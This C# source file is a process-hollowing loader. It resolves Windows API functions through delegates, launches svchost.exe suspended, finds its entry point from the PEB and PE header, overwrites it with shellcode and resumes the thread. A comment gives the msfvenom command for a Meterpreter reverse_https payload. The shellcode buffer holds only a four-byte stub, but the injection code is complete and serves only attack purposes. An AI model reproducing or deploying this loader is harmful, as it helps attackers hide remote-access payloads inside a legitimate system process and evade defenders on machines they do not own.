using System;
using System.Runtime.InteropServices;

namespace Standard_Process_Hollowing_Delegate
{
    class Program
    {

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        static extern IntPtr LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        // Declare delegates for each imported function
        private delegate IntPtr LoadLibraryADelegate(string lpLibFileName);
        private delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string lpProcName);
        private delegate bool CreateProcessDelegate(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );
        private delegate int ZwQueryInformationProcessDelegate(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen
        );
        private delegate bool ReadProcessMemoryDelegate(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );
        private delegate bool WriteProcessMemoryDelegate(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesWritten
        );
        private delegate uint ResumeThreadDelegate(IntPtr hThread);

        // Define the structures used by the API calls
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        static void Main(string[] args)
        {

            // Load the necessary libraries
            IntPtr kernel32Handle = LoadLibraryA("kernel32.dll");
            IntPtr ntdllHandle = LoadLibraryA("ntdll.dll");

            // Get function pointers using GetProcAddress
            IntPtr pLoadLibraryA = GetProcAddress(kernel32Handle, "LoadLibraryA");
            IntPtr pGetProcAddress = GetProcAddress(kernel32Handle, "GetProcAddress");
            IntPtr pCreateProcess = GetProcAddress(kernel32Handle, "CreateProcessA");
            IntPtr pReadProcessMemory = GetProcAddress(kernel32Handle, "ReadProcessMemory");
            IntPtr pWriteProcessMemory = GetProcAddress(kernel32Handle, "WriteProcessMemory");
            IntPtr pResumeThread = GetProcAddress(kernel32Handle, "ResumeThread");
            IntPtr pZwQueryInformationProcess = GetProcAddress(ntdllHandle, "ZwQueryInformationProcess");

            // Convert function pointers to delegates
            CreateProcessDelegate CreateProcess = (CreateProcessDelegate)Marshal.GetDelegateForFunctionPointer(pCreateProcess, typeof(CreateProcessDelegate));
            ReadProcessMemoryDelegate ReadProcessMemory = (ReadProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(pReadProcessMemory, typeof(ReadProcessMemoryDelegate));
            WriteProcessMemoryDelegate WriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(pWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            ResumeThreadDelegate ResumeThread = (ResumeThreadDelegate)Marshal.GetDelegateForFunctionPointer(pResumeThread, typeof(ResumeThreadDelegate));
            ZwQueryInformationProcessDelegate ZwQueryInformationProcess = (ZwQueryInformationProcessDelegate)Marshal.GetDelegateForFunctionPointer(pZwQueryInformationProcess, typeof(ZwQueryInformationProcessDelegate));

            // Initialize STARTUPINFO and PROCESS_INFORMATION structures
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // Create a new process (svchost.exe)
            bool res = CreateProcess(
                null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            // Initialize PROCESS_BASIC_INFORMATION structure
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            // Query process information to get the base address of the process
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // Read the memory to get the base address of svchost.exe
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // Read the PE header of svchost.exe
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            // Get the entry point of svchost.exe
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f csharp EXITFUNC=thread
            byte[] buf = new byte[4]
            {
                0xfc,0x48,0x83,0xe4
            };

            // Write the shellcode to the entry point of svchost.exe
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            // Resume the main thread of svchost.exe
            ResumeThread(pi.hThread);
        }
    }
}
